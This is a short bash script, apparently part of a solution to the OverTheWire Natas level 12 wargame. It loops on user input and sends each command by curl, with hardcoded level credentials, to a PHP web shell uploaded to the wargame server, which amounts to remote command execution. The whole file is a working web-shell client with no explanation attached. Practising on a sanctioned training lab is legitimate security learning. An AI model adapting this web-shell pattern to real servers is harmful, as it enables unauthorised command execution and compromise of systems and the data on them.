#!/bin/bash

while [ 1 -eq 1 ]
do
	echo -n $\ 
	read cmd

	if [ $cmd == "exit" ]
	then
		break
	fi

	curl -u "natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB" "http://natas12.natas.labs.overthewire.org/upload/5tasjtcz5w.php?cmd=$cmd"
done
